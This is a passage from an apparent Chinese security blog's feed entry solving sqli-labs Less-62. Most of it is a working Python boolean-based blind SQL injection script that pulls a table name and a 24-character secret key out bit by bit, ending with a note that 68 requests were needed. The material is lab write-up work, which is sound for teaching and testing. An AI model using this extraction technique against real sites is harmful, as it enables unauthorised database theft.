<span class="hljs-string">&quot; &quot;</span>))<br>    <span class="hljs-comment"># print(payload)</span><br><br>    resp = requests.get(url, params=&#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;)<br>    try_count += <span class="hljs-number">1</span><br><br>    infos = [<span class="hljs-string">&quot;Angelina&quot;</span>, <span class="hljs-string">&quot;Dummy&quot;</span>, <span class="hljs-string">&quot;secure&quot;</span>, <span class="hljs-string">&quot;stupid&quot;</span>, <span class="hljs-string">&quot;superman&quot;</span>, <span class="hljs-string">&quot;batman&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;admin1&quot;</span>]<br><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;Your Login name : (.*?)&lt;br&gt;&quot;</span>, resp.text)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">match</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>) <span class="hljs-keyword">in</span> infos<br>    bits = bit_values[infos.index(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))]<br>    <span class="hljs-keyword">return</span> bits<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">query, length</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取query查询结果的length个字符，每个字符只获取其第7位和前5位</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        b2 = extract_bits(query, i, [<span class="hljs-number">0b00000000</span>, <span class="hljs-number">0b00000001</span>, <span class="hljs-number">0b00000010</span>, <span class="hljs-number">0b00000011</span>, <span class="hljs-number">0b00000100</span>, <span class="hljs-number">0b00000101</span>, <span class="hljs-number">0b00000110</span>, <span class="hljs-number">0b00000111</span>])  <span class="hljs-comment"># 00000111</span><br>        b1 = extract_bits(query, i, [<span class="hljs-number">0b00000000</span>, <span class="hljs-number">0b00001000</span>, <span class="hljs-number">0b00010000</span>, <span class="hljs-number">0b00011000</span>, <span class="hljs-number">0b01000000</span>, <span class="hljs-number">0b01001000</span>, <span class="hljs-number">0b01010000</span>, <span class="hljs-number">0b01011000</span>])  <span class="hljs-comment"># 01011000</span><br>        <span class="hljs-keyword">if</span> b1 &amp; <span class="hljs-number">0b01000000</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># 该字符为数字</span><br>            bit = b1 | b2 | <span class="hljs-number">0b00100000</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 该字符为字母</span><br>            bit = b1 | b2<br>        res += <span class="hljs-built_in">chr</span>(bit)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    table_name = extract_data(<span class="hljs-string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>    secret_key = extract_data(<span class="hljs-string">&quot;select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x&quot;</span> % table_name, <span class="hljs-number">24</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br><br><br></code></pre></div></td></tr></table></figure><p>请求次数是68次。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;sqli-labs&lt;/a&gt;靶场Less-62题目，是通过布尔注入获取一段secret key，该key存于&lt;code&gt;challenges&lt;/code&gt;数据库的某个随机表名的表内。要</summary>
      
    
    
    
    
    <category term="Web安全" scheme="https://ovi3.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
